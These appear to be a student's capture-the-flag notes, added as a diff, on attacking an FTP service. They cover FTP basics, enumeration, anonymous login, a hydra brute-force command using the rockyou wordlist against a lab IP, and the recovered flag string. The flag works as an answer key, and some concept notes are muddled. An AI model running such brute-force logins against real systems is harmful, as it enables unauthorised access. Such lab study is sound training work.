@@ -1,0 +1,62 @@
+FTP 
+---Notes ---
+---------------
+client- server
+----------------
+1.active (here the client opens the port and the server actively listens to connect to the client)
+2.passive(Here the server opens a port and the client passively connects to the server)
+-The client initiates the connection and the server checks the login credentials if they are valid
+-There are two channels
+  - Command channel - Transmitting and responding to commands
+   - Data channel- Data transfer
+- There are two channels so that to enable the sending and responding to commands as file
+-As the name indicates that is file trasfer protocol, It is an application protocol that allows 
+-As telnet it transfers information in plain text
+one of the common attack used is ARP-Spoofing attack on such systems
+
+----------------
+Enumeration.
+----------------
+- Open ports - 2
+- Variant of ftp server- vsftp
+-Check for anonymous login - yes(Connected)
+- Name - mike
+
+--------------
+Exploitation.
+--------------
+connect to the ftp server -
+ ----- ftp [ip] ----
+ftp 10.10.7.4
+username - anonymous
+password - clear
+ls , help, get
+get PUBLIC_NOTICE.txt
+more PUBLIC_NOTICE.txt
+
+name  - mike
+
+------
+hydra
+-------
+hydra -t 4 -l mike -P /usr/share/worldlists/rockyou.txt -vV 10.10.7.4 ftp
+
+---password---- = password
+
+login using ftp 10.10.7.4 
+name - mike
+password - password
+
+ls
+-----------
+flag
+---------
+
+Flag.txt = THM{y0u_g0t_th3_ftp_fl4g}
+
+
+
+------------------------Links for further studies---------------------
+https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
+https://attack.mitre.org/techniques/T1210/
+https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
